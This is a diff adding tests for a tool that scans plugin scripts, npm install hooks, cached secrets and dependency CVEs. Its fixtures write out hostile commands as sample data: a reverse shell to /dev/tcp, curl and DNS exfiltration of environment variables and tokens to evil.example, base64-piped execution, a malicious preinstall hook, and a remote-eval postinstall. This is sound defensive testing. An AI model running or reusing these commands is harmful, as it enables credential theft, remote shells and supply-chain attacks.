@@ -1342,7 +1342,9 @@ function mockFetchCapture(payload, status = 200) {
   check("detectTypeDetail 无特征 → instructions + none 理由",
     [dtNone.type, dtNone.reasonKey, dtNone.hintKey],
     ["instructions", "detectReason.none", "detectHint.none"]);
-  // 8. 脚本静态危险模式扫描（discussion #2269 承诺项，四类模式）
+  // 8. 脚本静态危险模式扫描（discussion #2269 承诺项；2026-08 规则集扩充：
+  //    按语言分表 bash/ps1 + 共享凭据字典，语义参考 ShellCheck/PSScriptAnalyzer/
+  //    Semgrep command-injection/GuardDog 启发式）
   const hazDir = join(process.env.DSH_HOME, "hazard-fixtures");
   const mkHaz = (name, content) => {
     const f = join(hazDir, name);
@@ -1367,9 +1369,208 @@ function mockFetchCapture(payload, status = 200) {
   ].join("\n")));
   check("scanScriptHazards ps1 三类命中", ps1Hits.map((h) => h.category),
     ["downloadExec", "pathStartup", "credRead"]);
+  // 新规则覆盖：混淆/外泄/持久化（每类抽代表）
+  const shObf = await lib.scanScriptHazards(mkHaz("obf.sh", [
+    "echo " + "Q2xpY2tIZXJlVG9Eb3dubG9hZE1hbHdhcmVQYXlsb2Fk" + " | base64 -d | sh"
+  ].join("\n")));
+  check("sh base64 管道混淆命中 obfuscation", shObf.map((h) => h.category), ["obfuscation"]);
+  const shExfil = await lib.scanScriptHazards(mkHaz("exfil.sh", [
+    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+  ].join("\n")));
+  check("sh 反向 shell 命中 exfil", shExfil.map((h) => h.category), ["exfil"]);
+  const ps1Persist = await lib.scanScriptHazards(mkHaz("persist.ps1", [
+    "__EventFilter Name=EvilFilter"
+  ].join("\n")));
+  check("ps1 WMI 事件订阅命中 pathStartup", ps1Persist.map((h) => h.category), ["pathStartup"]);
+  const ps1Dyn = await lib.scanScriptHazards(mkHaz("dyn.ps1", [
+    "Set-ExecutionPolicy Bypass -Scope Process"
+  ].join("\n")));
+  check("ps1 执行策略绕过命中 dynamicExec", ps1Dyn.map((h) => h.category), ["dynamicExec"]);
   check("scanScriptHazards 干净脚本无命中",
     (await lib.scanScriptHazards(mkHaz("clean.ps1", "Write-Host 'hi'\nNew-Item -Path ./out\n"))).length, 0);
   check("scanScriptHazards 文件缺失返回空", (await lib.scanScriptHazards(join(hazDir, "nope.sh"))).length, 0);
+  // 组合规则（文件级两遍扫描）：单行抓不住的「信号 A + 信号 B 共现」
+  const comboEnv = await lib.scanScriptHazards(mkHaz("combo-env.sh", [
+    "echo env | sort",                       // env 管道（信号 a 误报候选，无外联不触发）
+    'curl -d "data=$(printenv)" https://evil.example/collect'
+  ].join("\n")));
+  check("combo env 外泄组合命中 exfil",
+    comboEnv.some((h) => h.id === "combo-env-dump-exfil" && h.category === "exfil"), true);
+  check("combo env 无外联不触发", comboEnv.length, 1); // 仅 combo 一条，env|sort 不单独命中
+  const comboDl = await lib.scanScriptHazards(mkHaz("combo-dl.sh", [
+    "curl -o /tmp/x https://evil.example/x.exe",
+    "& /tmp/x"
+  ].join("\n")));
+  check("combo 下载+执行命中 downloadExec",
+    comboDl.some((h) => h.id === "combo-download-spawn"), true);
+  const comboDns = await lib.scanScriptHazards(mkHaz("combo-dns.sh", [
+    "nslookup $MYTOKEN.evil.example"
+  ].join("\n")));
+  check("combo DNS token 外带命中 exfil",
+    comboDns.some((h) => h.id === "combo-dns-token"), true);
+  // 组合规则不在无组合语义时误报（只有单信号：rc 写入命中合法，curl 行无下载执行形态）
+  const comboSingle = await lib.scanScriptHazards(mkHaz("combo-single.sh", "echo alias >> ~/.bashrc\ncurl -s https://a.com/ok.sh"));
+  check("combo 单信号无组合命中", comboSingle.some((h) => h.id?.startsWith("combo-")), false);
+  check("combo 单信号保留单行命中", comboSingle.map((h) => h.category), ["rcModify"]);
+
+  // 白名单降级：官方一键安装形态（raw.githubusercontent）仍报但 severity 降为 medium
+  const allowHit = await lib.scanScriptHazards(mkHaz("allow.sh",
+    "curl -s https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash"));
+  check("白名单官方形态仍命中 downloadExec", allowHit.map((h) => h.category), ["downloadExec"]);
+  check("白名单官方形态降级 medium", allowHit[0].severity, "medium");
+  // 非白名单域名保持 critical
+  const evilHit = await lib.scanScriptHazards(mkHaz("evil2.sh",
+    "curl -s https://evil.example/x.sh | bash"));
+  check("非白名单域名保持 critical", evilHit[0].severity, "critical");
+
+  // lifecycle 联合检测（package.json 恶意 JS 模式）
+  const lcDir = join(process.env.DSH_HOME, "lifecycle-fixtures");
+  mkdirSync(lcDir, { recursive: true });
+  writeFileSync(join(lcDir, "package.json"), JSON.stringify({
+    name: "evil-lifecycle", version: "1.0.0",
+    scripts: { preinstall: "node setup.js" },
+  }), "utf8");
+  writeFileSync(join(lcDir, "setup.js"),
+    "const cp = require('child_process');\ncp.exec('curl -s https://evil.example/x.sh | sh', { stdio: 'ignore' });\n",
+    "utf8");
+  const lcHits = await lib.scanLifecycleHazards(lcDir);
+  check("lifecycle preinstall 指向文件命中 JS 恶意模式", lcHits.length > 0, true);
+  check("lifecycle 命中含 script 字段", lcHits.every((h) => h.script === "preinstall"), true);
+  // 远程 eval 形态（命令文本内联）
+  writeFileSync(join(lcDir, "package.json"), JSON.stringify({
+    name: "evil-lifecycle2", version: "1.0.0",
+    scripts: { postinstall: "node -e \"https.get(u, r => r.on('data', d => eval(d)))\"" },
+  }), "utf8");
+  const lcHits2 = await lib.scanLifecycleHazards(lcDir);
+  check("lifecycle 命令文本内联远程 eval 命中", lcHits2.some((h) => h.id === "remote-eval"), true);
+  // 干净 lifecycle 无命中
+  writeFileSync(join(lcDir, "package.json"), JSON.stringify({
+    name: "clean-lifecycle", version: "1.0.0",
+    scripts: { postinstall: "node scripts/build.js" },
+  }), "utf8");
+  mkdirSync(join(lcDir, "scripts"), { recursive: true });
+  writeFileSync(join(lcDir, "scripts", "build.js"), "console.log('build ok');\n", "utf8");
+  check("lifecycle 干净脚本无命中", (await lib.scanLifecycleHazards(lcDir)).length, 0);
+
+  // 安装前 secrets 扫描（scanCacheSecrets：目录遍历 + 扩展名过滤 + 上限）
+  const secDir = join(process.env.DSH_HOME, "secrets-fixtures");
+  // token fixture 拼接构造：避免源码出现完整密钥字面量（平台 secret scanning push protection）
+  const secP = (...p) => ["sk-", ...p].join("");
+  mkdirSync(join(secDir, "lib"), { recursive: true });
+  mkdirSync(join(secDir, "node_modules", "dep"), { recursive: true });
+  writeFileSync(join(secDir, "config.js"), `module.exports = { apiKey: "${secP("AbCd1234EfGh5678IjKl90Mn")}" };\n`, "utf8");
+  writeFileSync(join(secDir, "lib", "settings.json"), JSON.stringify({ password: "Tr0ub4dor&3XYZ" }), "utf8");
+  // node_modules 内的命中必须被跳过（依赖目录不算插件源码泄露）
+  writeFileSync(join(secDir, "node_modules", "dep", "index.js"), `const k = "${secP("ZxYw9876VuTs5432RqPo12Mn")}";\n`, "utf8");
+  const secHits = await lib.scanCacheSecrets(secDir);
+  check("secrets 已知密钥结构命中", secHits.some((h) => h.kind === "secret-key" && h.file === "config.js" && h.line === 1), true);
+  check("secrets 关键词邻近命中", secHits.some((h) => h.kind === "context" && h.file === "lib/settings.json"), true);
+  check("secrets 跳过 node_modules", secHits.every((h) => !h.file.includes("node_modules")), true);
+  check("secrets 相对路径正斜杠", secHits.every((h) => !h.file.includes("\\")), true);
+  // .env 文件（无扩展名形态）也要扫到
+  writeFileSync(join(secDir, ".env.local"), "API_KEY=ghp_abcdefghijklmnopqrstuvwxyz0123456789\n", "utf8");
+  const secHits2 = await lib.scanCacheSecrets(secDir);
+  check("secrets .env 基名文件命中", secHits2.some((h) => h.file === ".env.local" && h.kind === "github"), true);
+  // 干净仓库无命中
+  const secClean = join(secDir, "clean");
+  mkdirSync(secClean, { recursive: true });
+  writeFileSync(join(secClean, "index.js"), "console.log('hello world');\n", "utf8");
+  check("secrets 干净仓库无命中", (await lib.scanCacheSecrets(secClean)).length, 0);
+  // 不存在的目录返回空
+  check("secrets 目录缺失返回空", (await lib.scanCacheSecrets(join(secDir, "nope"))).length, 0);
+
+  // 安装前依赖 CVE 扫描（readVulnScanDeps 纯函数 + scanCacheVulnerabilities mock API）
+  const vulnPkg = {
+    name: "vuln-fixture", version: "1.0.0",
+    dependencies: { lodash: "^4.17.15", express: "4.18.2" },
+    optionalDependencies: { fsevents: "^2.3.2" },
+    devDependencies: { "dev-only-pkg": "^1.0.0" },
+  };
+  const vulnDeps = lib.readVulnScanDeps(vulnPkg, new Map([["lodash", "4.17.15"]]));
+  check("cve deps 含 dependencies+optional", vulnDeps.map((d) => d.name).sort(), ["express", "fsevents", "lodash"]);
+  check("cve lockfile 精确版本优先", vulnDeps.find((d) => d.name === "lodash").version, "4.17.15");
+  check("cve 无锁文件剥 ^ 取下界", vulnDeps.find((d) => d.name === "fsevents").version, "2.3.2");
+  check("cve devDependencies 不进扫描面", vulnDeps.some((d) => d.name === "dev-only-pkg"), false);
+  const cveDir = join(process.env.DSH_HOME, "cve-fixtures");
+  mkdirSync(cveDir, { recursive: true });
+  writeFileSync(join(cveDir, "package.json"), JSON.stringify(vulnPkg), "utf8");
+  // mock：lodash@4.17.15 命中 critical/high，express/fsevents 干净
+  const origVulnFetch = globalThis.fetch;
+  globalThis.fetch = async (url, opts) => {
+    if (!String(url).includes("/security/advisories/bulk")) return { ok: false, status: 404 };
+    const req = JSON.parse(String(opts.body));
+    const payload = {};
+    if (req.lodash?.[0] === "4.17.15") {
+      payload.lodash = [{
+        severity: "critical", title: "Prototype Pollution in lodash",
+        vulnerable_versions: ">=4.0.0 <4.17.21", url: "https://github.com/advisories/GHSA-test"
+      }];
+    }
+    return {
+      ok: true, status: 200,
+      json: async () => payload,
+      text: async () => JSON.stringify(payload),
+      arrayBuffer: async () => Buffer.from(JSON.stringify(payload)),
+    };
+  };
+  try {
+    const vulnHits = await lib.scanCacheVulnerabilities(cveDir);
+    check("cve bulk API critical/high 命中", vulnHits.length, 1);
+    check("cve 命中字段完整", [vulnHits[0].name, vulnHits[0].severity, vulnHits[0].title.includes("Prototype Pollution")],
+      ["lodash", "critical", true]);
+    // moderate/low 不弹（只收 critical/high）
+    globalThis.fetch = async (url, opts) => {
+      if (!String(url).includes("/security/advisories/bulk")) return { ok: false, status: 404 };
+      const req = JSON.parse(String(opts.body));
+      const payload = req.lodash ? { lodash: [{ severity: "moderate", title: "ReDoS", vulnerable_versions: "<4.17.21", url: "" }] } : {};
+      return {
+        ok: true, status: 200,
+        json: async () => payload,
+        text: async () => JSON.stringify(payload),
+        arrayBuffer: async () => Buffer.from(JSON.stringify(payload)),
+      };
+    };
+    const vulnModerate = await lib.scanCacheVulnerabilities(cveDir);
+    check("cve moderate/low 不命中弹窗面", vulnModerate.length, 0);
+    // 网络失败静默降级（不阻断安装）
+    globalThis.fetch = async () => { throw new Error("network down"); };
+    check("cve 网络失败静默降级", (await lib.scanCacheVulnerabilities(cveDir)).length, 0);
+    // API 非 200 同样降级
+    globalThis.fetch = async () => ({ ok: false, status: 503 });
+    check("cve API 非 200 静默降级", (await lib.scanCacheVulnerabilities(cveDir)).length, 0);
+  } finally {
+    globalThis.fetch = origVulnFetch;
+  }
+  // package.json 缺失返回空
+  check("cve package.json 缺失返回空", (await lib.scanCacheVulnerabilities(join(secDir, "clean"))).length, 0);
+  // file: 协议依赖从目标分包 package.json 取版本
+  const cveFileDir = join(process.env.DSH_HOME, "cve-file-fixture");
+  mkdirSync(join(cveFileDir, "packages", "local-a"), { recursive: true });
+  writeFileSync(join(cveFileDir, "package.json"), JSON.stringify({
+    name: "vuln-file", version: "1.0.0",
+    dependencies: { "local-a": "file:packages/local-a" },
+  }), "utf8");
+  writeFileSync(join(cveFileDir, "packages", "local-a", "package.json"),
+    JSON.stringify({ name: "local-a", version: "2.0.3" }), "utf8");
+  globalThis.fetch = async (url, opts) => {
+    if (!String(url).includes("/security/advisories/bulk")) return { ok: false, status: 404 };
+    const req = JSON.parse(String(opts.body));
+    const payload = req["local-a"]?.[0] === "2.0.3" ? { "local-a": [{ severity: "high", title: "XSS", vulnerable_versions: "<2.1.0", url: "" }] } : {};
+    return {
+      ok: true, status: 200,
+      json: async () => payload,
+      text: async () => JSON.stringify(payload),
+      arrayBuffer: async () => Buffer.from(JSON.stringify(payload)),
+    };
+  };
+  try {
+    const fileHits = await lib.scanCacheVulnerabilities(cveFileDir);
+    check("cve file: 协议依赖读子包版本命中", fileHits.length, 1);
+    check("cve file: 命中版本正确", [fileHits[0].name, fileHits[0].version], ["local-a", "2.0.3"]);
+  } finally {
+    globalThis.fetch = origVulnFetch;
+  }
+
   // 9. CLI 指令 npm 等价回退纯函数（issue #54 archify 教训）
   check("isNpmCliTarget scope 包带版本", lib.isNpmCliTarget("@tt-a1i/archify-dsh@0.1.0"), true);
   check("isNpmCliTarget 裸包名", lib.isNpmCliTarget("dsh-web-ui-all"), true);
